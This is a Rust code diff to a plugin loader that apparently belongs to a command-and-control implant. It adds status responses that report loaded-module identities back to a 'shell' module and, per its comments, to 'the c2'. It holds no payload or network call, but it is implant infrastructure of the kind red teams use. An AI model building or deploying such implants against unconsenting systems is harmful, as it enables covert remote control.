@@ -40,6 +40,7 @@ impl Drop for FileDescriptor {
 
 #[derive(Debug)]
 enum LoadError {
+    Success,
     Critical,
     Waiting,
     InvalidLength,
@@ -182,6 +183,46 @@ impl LibraryLoader {
 
         Ok(PluginModule::new(so_addr, module_vtable, instance))
     }
+
+    fn send_response(
+        &self,
+        bus_channel: &Sender<BusMessage>,
+        identity: Option<ModuleIdentity>,
+        retcode: LoadError,
+    ) -> bool {
+        /*
+         * Retcode
+         * Option<Identity> -- None == 0
+         */
+        const LOADER_RESPONSE_LEN: usize = 4;
+
+        let identity = match identity {
+            Some(identity) => identity.0,
+            None => 0u32,
+        }
+        .to_be_bytes();
+
+        let mut packet: Vec<u8> = Vec::new();
+        if packet.try_reserve(LOADER_RESPONSE_LEN).is_err() {
+            return false;
+        }
+
+        packet.extend_from_slice(&(retcode as u8).to_be_bytes());
+        packet.extend_from_slice(&identity);
+
+        if bus_channel
+            .try_send(BusMessage {
+                identity: ModuleIdentity::COMMS,
+                remote: Some(ModuleIdentity::SHELL),
+                msg: packet,
+            })
+            .is_err()
+        {
+            return false;
+        }
+
+        true
+    }
 }
 
 #[async_trait::async_trait]
@@ -225,8 +266,11 @@ impl Module for LibraryLoader {
                             Ok(addr) => addr,
                             Err(LoadError::Critical) => break,
                             Err(err) => {
-                                //todo: take the error and return a response back to the c2 and then continu
                                 sozo_debug!("LibraryLoader::run", "load_shared_object returned err -- {:?}", err);
+                                if !self.send_response(&bus_channel, None, err) {
+                                    break;
+                                }
+
                                 continue;
                             }
                         };
@@ -236,16 +280,25 @@ impl Module for LibraryLoader {
                             Err(LoadError::Critical) => break,
                             Err(err) => {
                                 sozo_debug!("LibraryLoader::run", "create_plugin returned err {:?}", err);
+                                if !self.send_response(&bus_channel, None, err) {
+                                    break;
+                                }
+
                                 continue;
                             }
                         };
+
+                        let identity = plugin.get_identity();
 
                         if !self.bus_ctrl.register(Box::new(plugin)).await {
                             sozo_debug!("LibraryLoader::run", "error occured while performing registration and execution of requested plugin");
                             break;
                         }
 
-                        sozo_debug!("LibraryLoader::run", "plugin successfully registered and executed within module bus");
+                        sozo_debug!("LibraryLoader::run", "plugin: {:?} -- successfully registered and executed within module bus", identity);
+                        if !self.send_response(&bus_channel, Some(identity), LoadError::Success) {
+                            break;
+                        }
                     } else {
                         break;
                     }
@@ -259,6 +312,3 @@ impl Module for LibraryLoader {
         self.tx.try_send(msg).is_ok()
     }
 }
-
-// need to craft the error response back to shell module from load and create -- currently just `continue`
-// if we reigster successfully, we need to respond back with retcode as well as the identity number os it can be registered locally on c2
